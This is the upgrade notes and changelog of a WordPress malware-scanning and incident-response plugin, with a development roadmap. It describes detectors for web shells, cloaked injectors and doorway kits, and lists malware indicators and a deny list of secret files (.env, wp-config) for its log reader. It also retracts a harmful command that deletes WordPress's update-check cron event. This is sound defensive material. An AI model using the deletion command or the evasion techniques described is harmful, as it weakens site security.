If a previous scan told you to run `wp cron event delete wp_version_check` or `wp cron event delete wp_scheduled_delete`, do not - and if you already did, restore them by deactivating and reactivating WordPress core's scheduling (the events are re-created automatically on the next admin page load, or run `wp cron event schedule wp_version_check now twicedaily`). Deleting those stops WordPress checking for updates. That advice was wrong and this release removes it.

Cron findings against core scheduled events now say what to do instead: find what attaches the handler, rather than deleting the schedule. A new high-severity finding appears when a cron handler exists only in evaluated code, with the file that performed the eval and a command that prints the declaring file live.

Settings gains "Your own plugins". List the folder names of plugins you wrote, one per line. They stop appearing in the report of plugins without a wordpress.org baseline. They are not ignored: their PHP files are fingerprinted against the plugin's version, so an edit in place with no version bump is reported. If you routinely hotfix your own plugins on the live site, expect that finding, and bump the version when you do to keep it quiet.

## 1.4.10

No data migration; upload and activate as usual. On the first scan the plugin records your current registration settings as a baseline, so a later change can be recognised as a change.

Three new findings can appear. A new-user default role of administrator is critical and means every account created through the registration form becomes an administrator - if you did not set that, treat the site as compromised and audit every account created since you last knew it was clean. Open registration being switched on is reported only when it was previously off; if you opened it deliberately, the baseline updates and it will not be reported again. And a role granted capabilities it does not ship with is critical: check whether a membership or e-commerce plugin is responsible before acting, because some legitimately extend roles.

Nothing here is changed for you. These are your site's settings, and a security plugin quietly rewriting a membership site's registration configuration would be worse than the problem. Each finding names the option and what to set it back to.

If you are reading this because accounts are appearing that you did not create: check the new-user default role first, then the role capabilities. If registration is off and both of those are clean, the accounts are being created programmatically and the route is a backdoor or a vulnerable plugin rather than a setting - the Events tab will show the address and the sequence.

## 1.4.9

Documentation only - no code, no settings, no detection changes. Upload and activate as usual.

The forward notes at the top of this guide were rewritten. They had been describing 1.3.98 through 1.4.1 as upcoming work long after those releases shipped, so anyone reading them to find out what was ahead got the wrong answer. They now cover the scanner restructuring, internationalisation, and EDR Phases 2 to 5, along with the three decisions still open - geolocation, session fingerprinting, and deception - and why the features that depend on them ship dormant.

The version number moved even though no code did. That is deliberate rather than untidy: the plugin's own Markdown files are covered by its self-integrity baseline, and that baseline is keyed to the version, so republishing changed documentation under the same number would make existing installs report their own docs as modified.

## 1.4.8

No data migration, no settings changes, no detection changes; upload and activate as usual. Nothing about how the plugin behaves should look different.

What changed is when code loads. Previously every class was loaded on every request, so an anonymous visitor viewing a page caused WordPress to parse around 865 KB of this plugin, including the scanner that only runs on cron. Classes are now autoloaded, and a typical front-end request loads about 36 KB. If you run a page-speed or query-monitor tool against the front end, that difference should be visible.

If you have custom code referencing this plugin's classes, it keeps working: autoloading makes classes available on reference rather than requiring them up front, so anything that resolved before still resolves.

The bundled documentation was also refreshed. For several releases the version number in doc/readme.md was updated while its content was not, so it described a plugin that stopped at the Content-Security-Policy and event-log era. It now covers tamper protection, behavioural monitoring, and the detection families added through 1.4.7.

## 1.4.7

No data migration; upload and activate as usual. The event table gained no new columns - the session, incident, and correlation fields have been in the schema since 1.3.99 and are simply populated now.

What you will see: an Incidents card at the top of the Events tab, grouping related activity by who did it and when, with a cumulative risk score and band for each. It fills as the site is used, so it will be empty immediately after upgrading. Sign-ins, account changes, plugin and theme activity, uploads, and visits to sensitive admin screens are recorded from now on.

Two things worth knowing. Admin screen views are limited to the screens that actually matter and repeat visits are collapsed within a session, so the event log will not fill with noise from ordinary use. And nothing here removes anything: a high-risk incident is an alarm to read, not an action taken. If you want to change how events are weighted once you have seen real data, the score table is exposed through the wps_edr_risk_scores filter and the bands through wps_edr_risk_bands.

Geolocation is deliberately absent, so the country, city, and network fields stay empty and no data leaves your server.

## 1.4.6

Upload and activate as usual. On activation the plugin writes one small file into wp-content/mu-plugins named 0-wps-guard.php, plus a dot-prefixed key file beside it. That guard is what keeps the plugin running if something tries to switch it off, and it is removed automatically when you uninstall.

Two things to expect. Deactivating from the Plugins screen behaves exactly as before - the guard reads a signed record of whether the plugin is meant to be active, and the deactivation hook sets that record, so a deliberate deactivation is respected and stays respected. If mu-plugins is not writable on your host, the plugin still works but tamper protection will show as unavailable in Diagnostics; that status row is worth checking after upgrading, since a guard that silently failed to install is worse than none.

If you have previously found this plugin deactivated on a site you did not deactivate it on, that is what this release addresses. From now on the attempt is restored and recorded rather than silent. Bear in mind the honest limit: an attacker who can write to mu-plugins can remove the guard too, so this raises the cost and guarantees evidence rather than making the plugin impossible to disable.

## 1.4.5

No data migration; upload and activate as usual. Two new finding types. A cloaked content injector is malware that serves content to visitors while returning early for logged-in administrators and for search-engine and SEO crawlers - if the file sits in its own plugin or theme folder, that whole folder is removed, because a fake plugin built for this has no other purpose. Source deliberately obfuscated against scanning means a file splits its identifiers across concatenated fragments to stop scanners finding known names; that is review-only, since obfuscation is a strong smell rather than proof.

Worth knowing if you have ever concluded a site was clean: this family is specifically built so that you cannot see it. Browsing your own site while logged in shows nothing, and external scanners are cloaked against too. The way to check what visitors actually receive is to request the site logged out, with an ordinary browser user agent, and read the page source.

## 1.4.4

No data migration; upload and activate as usual. Two new finding types can appear. A file-operation web shell is a file that browses, writes, deletes, and uploads straight from request parameters without containing any code-execution function - it is removed automatically only when found as a site's index.php, and reported for review anywhere else, because some media and backup plugins legitimately do similar work. A PHP configuration override means a php.ini or .user.ini was found switching hardening back off; these are always review-only, since your host may have placed the file deliberately, but one inside wp-content is flagged critical because nothing there has a legitimate reason to change PHP security settings. If you see the latter, look for the payload it was placed there to enable rather than just deleting the config file.

## 1.4.3

No data migration; upload and activate as usual. Two new finding types can appear. An obfuscated PHP loader means a file is written to be unreadable - goto-flattened control flow, runtime-assembled function names, a packed payload. Found in an index.php it is removed automatically to quarantine, because nothing legitimate is ever packed there; found anywhere else it is reported for review, since a few commercial plugins ship through obfuscators, so confirm what the file belongs to before deleting it. An executable payload in a directory index stub means an index.php that should be a tiny "Silence is golden" placeholder instead contains working code - review it, and bear in mind that if the surrounding plugin looks genuine it probably is, and is being used as camouflage for that one file. If either fires, the useful next step is checking whether the plugin folder name matches the plugin it claims to be: a random folder name wrapped around real software is a strong sign of a trojanised copy.

## 1.4.2

No data migration; upload and activate as usual. A Docs tab appears at the end of the tab bar, alongside Settings, presenting the documentation bundled in the release - readme, upgrade notes, changelog, and the reference document - rendered inside WordPress with no internet connection required. Two notes. The changelog and upgrade notes are large, so the first view of each takes a moment to render and is then cached until the file changes. And doc files are now part of the plugin's self-integrity baseline, so if you edit the bundled markdown by hand the scanner will report it as modified until the next release re-baselines - the same behaviour as hand-editing plugin code, and for the same reason.

## 1.4.1

No data migration; upload and activate as usual. Two new review-only finding types can appear. A doorway kit cloaking configuration means a JSON file was found carrying the allow and deny lists these kits use to hide spam from crawlers - the finding names the likely kit directory, and you should remove the whole kit rather than just the config file. A browser file-manager web shell means a complete filesystem-control application was found; if it sits in uploads or beside kit components it is flagged critical, otherwise it is a review item, because a file manager can be a tool you installed deliberately. Neither is ever auto-deleted. Existing kit detection also got harder to evade: it no longer requires the kit to keep its original folder name, so previously-missed renamed kits may now surface on your first scan after upgrading.

## 1.4.0

No data migration; upload and activate as usual. Three things you will notice. Repeating the same destructive action now has a cooldown - thirty seconds for the heavyweight irreversibles (salt regeneration, user deletion, plugin-folder deletion, quarantine empty, bulk base64-option deletion), ten seconds for per-item deletes and cleans - with a clear message telling you how long to wait; different actions have independent windows, so working through a mixed cleanup is unaffected. The scanner now verifies WP Perf Shield's own files first on every scan: if you hand-edit a plugin file it will be flagged as modified until the next release upload re-baselines it, which is the feature working as intended - an attacker's first move against a security plugin is editing the security plugin. And support bundles from Diagnostics now end with a signature block; keep it with the bundle, since it is what proves the export was not altered afterwards.

## 1.3.99

No action needed; upload and activate as usual. On the first admin load the plugin creates its events table, imports the existing file log into it as pre-chain entries (preserved but unsigned - the verification banner counts them separately), and starts chaining every new event. What you will notice on the Events tab: a verification line (green when the chain closes; a loud failure naming the first bad record if someone has edited or deleted rows directly), a User column, and a note that Clear log now empties only the file copy - the store is append-only, rotates at ten thousand rows, and records the clearance itself as an event. If you scripted anything against the raw events.php file, it still works and still receives every event; the store is additive.

## 1.3.98

No data migration; upload and activate as usual. Two things you may notice. On a slow or busy host the scan may now report itself as partial, with a medium-severity row naming the checks it skipped after the 45-second budget ran out - run a manual scan from the Overview tab at a quieter moment and the skipped checks run then; previously the same situation was a silent mid-scan death with nothing cached. And two new review-only finding types can appear: a known C2 domain referenced in a PHP file (judge it - a security plugin's blocklist legitimately contains such domains, anything else is an implant) and a redirect injection in a theme's functions.php (open the file and remove the injected block; the finding explains why deleting the whole file is the wrong move).

## 1.3.97

No data migration; upload and activate as usual. Three behavioural notes. First, the new .htaccess cloaked-redirect check is review-only: if it flags a rule, WP Perf Shield reports it and leaves .htaccess untouched, because legitimate hotlink-protection rules use the same referer condition - read the flagged rule and remove it yourself if it isn't one you added. Second, pre-clean backups have moved: the wp-login.php, functions.php, wp-cron.php, wordfence-waf.php, and .user.ini cleaners now copy the pre-clean file into the quarantine store rather than leaving a `.wps-backup` copy beside the original, so if you need to roll a clean back you'll find the snapshot under the Quarantine card on the Forensics tab. Restore refuses to overwrite a file that's back in place, so remove or rename the current file first. Third, deleting a malicious `wp_options` row now snapshots it into quarantine first, so a false-positive option deletion can be restored the same way; this follows the `quarantine_enabled` toggle, so with quarantine turned off, option deletion stays non-recoverable exactly as before.

## 1.3.96

No data migration. If you saved Settings on 1.3.95 the stored `appearance` value ('auto') is respected; fresh installs and anyone who never saved now default to `light`, which renders the plugin exactly as 1.3.94 did. The 1.3.95 visual normalisations are reverted: severity gradients, pastel panels, zebra striping, callout yellows, and per-surface shade differences are all back to their original values. The dark scheme remains available and now covers the component-class surfaces; the legacy findings/source panels intentionally keep their original light styling in dark mode until a value-preserving dark pass is approved separately.

## 1.3.95

No data migration. One new settings key, `appearance` (values `auto`, `light`, `dark`; default `auto`), saved by the existing Settings form and read defensively, so installs upgrading without ever visiting Settings behave exactly as before in the Auto scheme.

Internal API note: `forensic_action_button()`'s fifth parameter is now a class string (previously a style string). The helper is private to the forensics renderer, so nothing outside the plugin can be affected.

Deliberate visual normalisations, so a before/after diff of the admin reads as intended rather than as regressions: severity gradient card backgrounds are flattened to their solid tint tokens, table cell paddings are unified to the component defaults, and a handful of 1-2px margins snapped to the shared spacing utilities. The dark scheme applies only inside the plugin's own screens (`.wps-app`); the rest of wp-admin is untouched.

## 1.3.94

Quarantine-first remediation. From this release, removal moves a confirmed threat into `wp-content/wps-quarantine/` (neutralised, non-executable, restorable for 30 days) instead of destroying it, and root-level kits that the old delete routine silently refused are now genuinely removed.

Path: upload and activate as usual; no schema changes. Two things to know after upgrading. First, a new Settings toggle - "Quarantine removed threats instead of deleting them" - is on by default; untick it if you want the pre-1.3.94 hard-delete behaviour. Second, removed threats now appear in a Quarantine card at the top of the Forensics tab, where each entry can be restored (false positives) or purged; everything purges automatically after 30 days. If you previously saw a root-level kit finding reappear scan after scan despite auto-remediation being on, that was the fixed bug - expect it to be quarantined on the first scan after upgrading.

## 1.3.93 Re-dropper Hunt Path

Version `1.3.93` adds a Forensics "Re-dropper hunt" card. No data migration.

### Confirm the behaviour

1. Forensics shows a "Re-dropper hunt" card with six read-only SSH commands.
2. A doorway kit returning under a new name still escalates to RE-DROPPED Nx (1.3.91).
3. The hunt commands target user+system cron, account-wide kit/stub search, and
   recently-modified PHP outside the webroot.

### If a kit keeps reappearing

Run the hunt commands over SSH. The scanner removes the kit but cannot read a system
crontab or a dropper outside the WordPress install. The stub names
canaryspillsdinky.php and unmadesuerscorker.php are reused across drops  search for
them account-wide to find the staged copy or the script re-planting it.

### Verify and package

4. `php -l` class-forensics.php and class-admin-forensics.php.
5. Confirm build_redropper_hunt_commands() returns the six commands.
6. Markers read `1.3.93`; `INDICATOR_VERSION` stays `1.3.81-1`.
7. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.92 In-plugin Log Forensics Path

Version `1.3.92` moves the attack-window file query in-plugin and reframes the SSH
log panel. No data migration.

### Confirm the behaviour

1. Forensics shows a new "Recently-modified executable files" card listing PHP
   under plugins/mu-plugins/uploads newest-first  no SSH.
2. The "Server log queries" panel is retitled to a fallback, points at the Logs
   tab first, and no longer lists the filesystem find.
3. The render-hijacker grep commands now include the catalogue's current cfg keys.

### Verify and package

4. `php -l` class-forensics.php and class-admin-forensics.php.
5. Re-run the harness (recent scan newest-first, non-PHP excluded; cfg keys sourced;
   find removed).
6. Markers read `1.3.92`; `INDICATOR_VERSION` stays `1.3.81-1`.
7. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.91 Doorway-kit Re-drop Awareness Path

Version `1.3.91` makes check_doorway_backdoor_kit() recurrence-aware. No data
migration; it adds one option, wps_doorway_kit_history (autoload off).

### Confirm the behaviour

1. A first kit detection reads as before (critical, auto-deleted at its location).
2. The same kit returning under a new random folder name escalates to
   "RE-DROPPED Nx  active re-dropper present", with guidance to hunt the dropper.
3. A single instance left in place across scans does not inflate the count.

### If a kit keeps reappearing

The escalation means the kit is being re-planted from outside itself. Check wp-cron
and system cron, mu-plugins, wp-config.php / auto_prepend_file, and any co-resident
web shell. Deleting the kit again will not stop the cycle until the dropper is gone.

### Verify and package

4. `php -l` the scanner.
5. Re-run the harness (first sighting normal; same-name no inflation; renamed = re-drop).
6. Markers read `1.3.91`; `INDICATOR_VERSION` stays `1.3.81-1`.
7. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.90 Supply-chain Awareness and Checksum-cache Fix Path

Version `1.3.90` surfaces the plugins that integrity cannot verify and fixes the
transient-failure caching in the checksum fetch. No data migration.

### Confirm the behaviour

1. On a site with a premium/custom plugin, the scan shows one low-severity line
   listing the plugins with no wordpress.org baseline. It does not email (the scan
   only emails on critical findings).
2. A repo plugin still verifies clean; a tampered or planted PHP file still flags
   critical (unchanged from 1.3.89).
3. If .org is briefly unreachable, plugins are not mislabelled as premium  the
   fetch retries next scan instead of negative-caching for a week.

### Verify and package

4. `php -l` the scanner.
5. Re-run the stubbed-network harness (clean repo not listed; 404 premium listed +
   cached; transient failure not listed + retryable).
6. Markers read `1.3.90`; `INDICATOR_VERSION` stays `1.3.81-1`.
7. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.89 Plugin Integrity (wordpress.org Checksums) Path

Version `1.3.89` verifies installed repo plugins against the official wordpress.org
checksums. No data migration; it fetches lazily and caches for a week.

### Confirm the behaviour

1. A repo plugin with a modified PHP file is flagged MODIFIED (critical); a planted
   PHP file inside a repo plugin is flagged EXTRA (critical). Both review-only.
2. Premium/custom plugins (no .org checksums) are skipped, not flagged.
3. Non-PHP soft changes (readme.txt etc.) and non-PHP extras are not flagged.

### Verify and package

4. `php -l` the scanner.
5. Re-run the unit tests for parse and compare (whitelist match-any, md5 fallback,
   modified/extra PHP, non-PHP ignored).
6. The live wordpress.org fetch is not exercised in the harness  confirm it on a
   real install (a clean plugin verifies; a hand-edited plugin file flags).
7. Markers read `1.3.89`; `INDICATOR_VERSION` stays `1.3.81-1`.
8. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.88 Sample Validation and Placeholder Backstop Path

Version `1.3.88` validates a new externalized-payload sample (caught unchanged) and
extends the camouflage placeholder match. No data migration.

### Confirm

1. The ultra-layout-scanner-15c8 shape is caught by check_external_payload_loader
   (critical/auto-delete) and now also by check_plugin_metadata_camouflage (high).
2. A plugin with a real URI, or a wordpress.org/plugins/<slug>/ directory link, is
   not flagged by the placeholder check.

### Verify and package

3. `php -l` the scanner.
4. Re-run the harness: sample flagged by both detectors; benign URIs clean.
5. Markers read `1.3.88`; `INDICATOR_VERSION` stays `1.3.81-1`.
6. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.87 PHP-Inventory Drift Tripwire Path

Version `1.3.87` adds a family-agnostic baseline tripwire for uploads and
mu-plugins. No data migration; it self-establishes on the first scan.

### Confirm the behaviour

1. First scan after upgrade: a baseline is captured and nothing is flagged.
2. Drop or change a PHP file under uploads or mu-plugins: the next scan flags it
   (new = critical, changed = high). Anomalies are review-only, not auto-deleted.
3. After a confirmed cleanup, click "Reset PHP-inventory baseline" on the
   Hardening tab so the current clean set becomes the new reference.

### Verify and package

4. `php -l` the three changed files; check `assets/js/admin.js` parses.
5. Re-run the lifecycle simulation: establish -> drift (new + changed) -> reset ->
   clean, with non-PHP files never tracked.
6. Markers read `1.3.87`; `INDICATOR_VERSION` stays `1.3.81-1`.
7. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.86 Known-Bad DB Option and Cron Auto-Clean Path

Version `1.3.86` brings known-bad wp_options keys and malicious cron hooks into
the toggle-gated auto-remediation path and unifies the detection/deletion list.
No data migration.

### Confirm the behaviour

1. With auto-remediation ON (default), a scan deletes catalogued known-bad
   options and unschedules malicious cron hooks, showing them as auto-deleted.
2. With auto-remediation OFF, the same items are flagged detect-only and point to
   the manual "Delete malicious DB options" button.
3. Detection now reads WPS_Indicators::malware_option_keys(); variants missing
   from the old inline list are detected again.

### Verify and package

4. `php -l` the scanner.
5. Re-run the reflection simulation: toggle ON deletes options + unschedules the
   malicious hook while leaving core cron and siteurl alone; toggle OFF reports
   detect-only with nothing removed.
6. Markers read `1.3.86`; `INDICATOR_VERSION` stays `1.3.81-1`.
7. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.85 Confirmed-Base64-Option Auto-Clean and Bulk-Delete Path

Version `1.3.85` makes confirmed base64 payload options behave like other
confirmed malware. No data migration; behaviour follows the existing
auto-remediation setting.

### Confirm the behaviour

1. With auto-remediation ON (default), run a scan on a site with confirmed
   clickfix_js / php_payload options: they are deleted in the scan pass and shown
   as auto-deleted. Each live option is re-validated before deletion.
2. With auto-remediation OFF, the Forensics base64 card shows a single
   "Delete all N flagged options" button; one click clears them all.
3. Core option names are always skipped; the report is spliced to surviving
   entries so counts stay correct.

### Verify and package

4. `php -l` the four changed files; check `assets/js/admin.js` parses.
5. Re-run the handler simulation: re-validation returns the right verdicts, and
   the bulk handler deletes confirmed options while skipping core names and
   preserving sibling findings.
6. Markers read `1.3.85`; `INDICATOR_VERSION` stays `1.3.81-1`.
7. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.84 Forensics Batch-Delete Fix Path

Version `1.3.84` is a server-side bugfix to the Forensics base64-option delete
handler. No settings, data migration, or detection changes.

### Confirm the fix

1. Run Forensics with several suspicious base64 options flagged.
2. Delete two or more in a row without reloading; each should succeed (before,
   only the first did).
3. The cached `wps_forensics_report` persists, losing only the deleted entry each
   time; `auto_prepend` and cron findings are untouched.
4. Safety gates unchanged: an option absent from the report is refused, and core
   option names are refused.

### Package

5. Markers read `1.3.84`; `INDICATOR_VERSION` stays `1.3.81-1`.
6. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.83 Externalized-Payload and Backdoor-Kit Path

Version `1.3.83` adds two structural detectors. No settings or data migration is
required.

### Confirm the new detections

1. `check_external_payload_loader()` flags a plugin that combines a read+decode
   loader PHP file, an opaque bundled payload blob, and an obfuscation tell
   (critical/auto-delete of the plugin folder).
2. `check_doorway_backdoor_kit()` flags and removes a `core/`-rooted doorway/
   backdoor kit scored by its structural tells (critical/auto-delete of the kit
   root, subject to a protected-path guard).

### Verify and package

3. `php -l` the scanner.
4. Re-run the malware and false-positive simulations: `page-image-scanner-23ed`
   and the `annealing`/`resweep` kit are flagged critical; a caching plugin with
   a `core/` subdir, a GeoIP plugin that `gzinflate`s a bundled `.dat`, and a
   `core/modules/` framework are not.
5. Markers read `1.3.83`; `INDICATOR_VERSION` stays `1.3.81-1`.
6. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.82 Persistence-Layer Detection Path

Version `1.3.82` closes a renamed-copy gap on the persistence side of the
campaign. It adds two structural branches; no data migration or settings change
is required.

### Confirm the new detections

1. `check_wp_content_dropins()` flags any audited drop-in that combines a decode
   call, a payload write, and a `mu-plugins` write target as a critical/auto-delete
   re-dropper, independent of the `session-manager` markers.
2. `check_mu_plugins()` flags a non-whitelisted MU plugin matching the rolling-XOR
   deobfuscation-guard shape (plus a high cue count) as a critical/auto-delete
   obfuscated payload.

### Verify and package

3. `php -l` the scanner.
4. Re-run the malware and false-positive simulations: the `rest-api-compat` kit
   raises three critical findings; legitimate cache/database drop-ins and MU
   plugins (and the tricky decode-but-not-to-mu-plugins and high-`chr()`-but-no-XOR
   fixtures) are not flagged by the new branches.
5. Markers read `1.3.82`; `INDICATOR_VERSION` stays `1.3.81-1` (indicator lists
   unchanged).
6. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.81 Branch Reconciliation Path

Version `1.3.81` reconciles two packages built on parallel branches from the
same `1.3.79` base. Each branch independently used the `1.3.79` label for
different detection work, and one branch then shipped a `1.3.80` safety release
containing only its own lineage. `1.3.81` takes the `1.3.80` safety build as the
base and ports the other branch's two detection methods and catalogue additions
onto it, advancing the version once so the two `1.3.79` definitions and the
orphaned `1.3.80` cannot collide again.

### Phase A: Confirm the base

1. Start from the `1.3.80` safety build, not from either `1.3.79` package.
2. Confirm the `1.3.80` guards are present: no `addons`/`scr` substring deletion,
   two-tier uploads-PHP policy, active-theme file protection, boundary-safe
   containment, version-and-locale-scoped checksum cache, restricted log reader,
   pre-clean backups.

### Phase B: Confirm the merged detections

3. `WPS_Scanner::check_admin_cookie_stealer()` is declared and registered in
   `run()`, and `WPS_Indicators::cookie_exfil_c2_domains()` is consumed.
4. `WPS_Scanner::check_theme_loader_plugin()` is declared and registered in `run()`.
5. `check_obfuscated_js_injector()` (the `1.3.80`-base JS-injector check) is still
   declared and registered.
6. `malware_option_keys()` contains `wp_1f20bc3f7f_cfg` and `wp_8447aa87d2_cfg`;
   `clickfix_known_shell_authors()` contains `Cache Solutions` and `WP Solutions`.

### Phase C: Verify and package

7. `php -l` every changed PHP file.
8. Confirm each merged method is declared once and registered once.
9. `WPS_Indicators::INDICATOR_VERSION` reads `1.3.81-1`.
10. Build the ZIP with `wp-perf-shield/` as the single root folder.

## 1.3.80 Safety Stabilization Path

Version `1.3.80` is a safety release for the `1.3.79` codebase. The version
number is intentionally bumped because the release changes runtime deletion
policy, remediation boundaries, backup behavior, and log-reader access rules.
It is not an indicator-catalogue release, so `WPS_Indicators::INDICATOR_VERSION`
remains `1.3.79-1`.

### Phase A: Release-Blocking Deletion Safety

Priority: P0. Complete before shipping with auto-delete enabled.

1. Remove broad plugin-folder substring matches for `addons` and `scr`.
2. Keep automatic plugin-folder deletion only for distinctive malware-family
   folder names and existing strong blocker matches.
3. Ignore harmless uploads `index.php` silence stubs.
4. Auto-delete uploads PHP only when known malware signatures are confirmed.
5. Report other uploads PHP as high severity review-only.
6. Block generic deletion and auto-remediation of active or parent theme
   critical files such as `functions.php`, `style.css`, and template entry
   files.
7. Fix planted `css.js` severity so lower-confidence matches do not present as
   critical and do not receive an automatic delete path.

Acceptance criteria:

1. A plugin folder named `some-addons-plugin` or `scraper-tools` is not marked
   critical merely because of its name.
2. A small uploads `index.php` containing only `<?php // Silence is golden.`
   is ignored.
3. A known malware PHP payload in uploads is still critical and auto-deleted
   when auto-delete is enabled.
4. A non-matching PHP file in uploads is reported for review without automatic
   deletion.
5. Generic delete actions refuse active-theme `functions.php` and `style.css`.
6. `css.js` payload scores below the critical threshold are high severity and
   review-only.

### Phase B: Path And Cache Correctness

Priority: P1. Complete in the same release as Phase A.

1. Replace self-directory prefix checks with boundary-safe containment checks.
2. Replace auto-remediation parent-path prefix checks with boundary-safe path
   comparison for already-deleted parent directories.
3. Include both WordPress version and locale in core-checksum cache keys.
4. Apply the checksum cache-key rule consistently in scanner and forensics
   paths.

Acceptance criteria:

1. A sibling directory such as `wp-perf-shield-malware/` is still scanned.
2. `/plugins/foo2` is not treated as covered after `/plugins/foo` is deleted.
3. Core checksum caches for different WordPress versions or locales do not
   collide.

### Phase C: Remediation And Diagnostics Hardening

Priority: P1/P2. Complete before release packaging.

1. Create timestamped, non-overwriting backups before `clean_login()`,
   `clean_functions()`, and `clean_cron()` write file replacements.
2. Record backup paths in remediation events or user-facing success messages.
3. Restrict log-reader access to log-like files and standard log directories.
4. Deny sensitive non-log files such as `.env`, SQL dumps, config files,
   archives, backups, JSON/INI files, and PHP-like files.
5. Keep `tools/update-indicators.php` CLI-only.

Acceptance criteria:

1. Each cleaner leaves a `{filename}.wps-backup-{YYYYmmdd-HHMMSS}` backup before
   writing.
2. The log reader still discovers `debug.log`, `error_log`, `access_log`, and
   standard cPanel/domlogs files.
3. The log reader refuses `.env`, `wp-config*`, `.sql`, `.zip`, `.tar`, `.gz`,
   `.ini`, `.json`, `.config`, `.php`, `.phtml`, and `.phar` files.
4. `tools/update-indicators.php` exits outside CLI context.

### Phase D: Pre-Release Verification

Priority: P0 for packaging.

1. Run the local PHP parser fallback or `php -l` across every PHP file.
2. Run `node --check assets/js/admin.js`.
3. Run `tools/verify-package.ps1` and confirm version markers match across the
   plugin header, `WPS_VERSION`, `readme.txt`, and `doc/readme.md`.
4. Confirm the ZIP has exactly one root folder, `wp-perf-shield/`.

Acceptance criteria:

1. PHP parser checks pass.
2. Admin JavaScript syntax check passes.
3. Version markers all read `1.3.80`.
4. Package layout check passes.

## Controlled Development Roadmap

This roadmap converts the current architecture review into a safe implementation pathway for future releases. Treat it as the working plan for changes after `1.3.27`.

### Current Architecture Summary

WP Perf Shield is a focused incident-response plugin with seven major areas:

1. `wp-perf-shield.php` bootstraps constants, includes classes, schedules scans, and still owns most AJAX remediation handlers.
2. `includes/class-admin.php` renders every admin tab, builds diagnostics, renders forensics, handles settings, and emits a large amount of inline markup.
3. `includes/class-blocker.php` blocks known malware activation, scrubs active-plugin lists, inspects uploaded ZIP files, records upload pathways, and temporarily blocks hostile IPs.
4. `includes/class-scanner.php` owns malware indicators, recursive filesystem checks, cached scan results, and auto-remediation of confirmed malware artifacts.
5. `includes/class-hardening.php` manages `wp-config.php` constants, targeted `wp-config.php` malware cleanup, `.htaccess` marker blocks, and auth salt rotation.
6. `includes/class-forensics.php` builds post-compromise evidence from media uploads, plugin timestamps, admin accounts, options, cron integrity, PHP-executable files, and core checksums.
7. `includes/class-logger.php` stores PHP-guarded JSON events in `logs/events.php` and migrates the legacy `wp-content/wps-security/events.php` file when present.

### Safe Change Boundaries

Keep these boundaries intact during every phase:

1. Do not broaden auto-delete behavior unless a finding is explicitly marked with `auto_delete` and its resolved `delete_path` is inside the intended safe boundary.
2. Do not clean `wp-config.php` from a plain hash mismatch. Clean only known removable malware patterns, create a backup, sanity-check the file, then update the baseline after a successful write.
3. Do not weaken the WP Perf Shield ZIP self-package exemption. It must apply only to a valid `wp-perf-shield/` package with the real main plugin file, and unknown extra PHP files must still be inspected.
4. Do not trust proxy headers for hostile-IP blocking until a trusted-proxy setting exists. `REMOTE_ADDR` is safer by default.
5. Keep nonce checks, capability checks, path containment checks, backups, cache invalidation, and event logging on every destructive action.
6. Keep `readme.txt` at plugin root. Keep project Markdown files in `doc/`. Keep assets in `assets/css/` and `assets/js/`.

### High-Risk Areas

The following areas must be treated as high risk:

1. `WPS_Scanner::auto_remediate()` because it deletes files and directories automatically.
2. AJAX handlers in `wp-perf-shield.php` that delete users, attachments, options, files, theme files, plugin folders, or replace core files.
3. `WPS_Blocker::maybe_block_request()` because it can block a legitimate administrator when an IP is shared, proxied, or previously misclassified.
4. `WPS_Blocker::block_zip_upload()` because a false positive can block plugin updates or legitimate ZIP uploads.
5. `WPS_Hardening::set_wpconfig_constant()`, `clean_wpconfig_malware()`, and `regenerate_salts()` because failures can affect site boot, updates, and logins.
6. `wps_clean_cron` remote replacement because it writes a WordPress core file and depends on remote source availability.
7. `WPS_Logger::log_event()` because exfil evidence and source-path details are sensitive.

### Files To Avoid Unless Necessary

Avoid broad edits to these files unless the phase explicitly requires them:

1. `includes/class-scanner.php`: indicator changes can create false positives or missed malware.
2. `includes/class-blocker.php`: upload-gate changes can lock out administrators or permit malware upload paths.
3. `wp-perf-shield.php`: do not keep adding handlers here; future work should reduce this file.
4. `includes/class-hardening.php`: file-write logic must stay narrow, backed up, and verified.
5. `logs/events.php`: never edit generated logs manually in a release change.
6. `doc/ssot.md`: treat as packaging and release policy; update deliberately when conventions change.

### WordPress Security Concerns

Current nonce and `manage_options` checks are a strong baseline, but future work should improve authorization precision:

1. Use `delete_plugins` for plugin-folder deletion where possible.
2. Use `delete_users` for user deletion where possible.
3. Use `delete_posts` or a stricter attachment check for forced attachment deletion.
4. Use `update_core` or equivalent strict checks for core file replacement actions.
5. Use `wp_unslash()` consistently before sanitizing all request values.
6. Avoid logging raw credentials or secrets unless explicitly needed for incident response. Prefer redaction or export-only access for future support bundles.
7. Keep direct web access protection for logs, but remember `.htaccess` does not protect nginx. The PHP guard in `events.php` remains mandatory.

### Performance Concerns

The scanner and forensics paths are intentionally thorough but can be expensive:

1. Recursive scans over plugins, themes, uploads, cache, mu-plugins, and `wp-content` should stay cached and manually force-runnable.
2. ZIP inspection should keep file-count and PHP-byte limits.
3. Event logging currently rewrites a 200-entry JSON file on each event. Do not grow retention significantly without a different storage strategy.
4. Core checksum verification and MD5 hashing can be slow on large or remote filesystems; cache remote checksum data and avoid doing it on every admin page load.
5. Admin rendering should avoid running heavy scans automatically. Tabs should render cached data unless the operator explicitly starts a scan or forensics run.

### Directory Compliance Concerns

All future work must preserve the following layout:

```text
wp-perf-shield/
  wp-perf-shield.php
  readme.txt
  assets/css/admin.css
  assets/js/admin.js
  doc/readme.md
  doc/upgrading.md
  doc/changelog.md
  doc/ssot.md
  includes/*.php
  logs/index.php
  logs/.htaccess
```

The release ZIP must contain exactly one root folder:

```text
wp-perf-shield/
```

Do not place `readme.md`, `upgrading.md`, `changelog.md`, or `ssot.md` at the ZIP root or plugin root.

### Phase 0: Baseline And Guardrails

Priority: P0. Do this before any refactor.

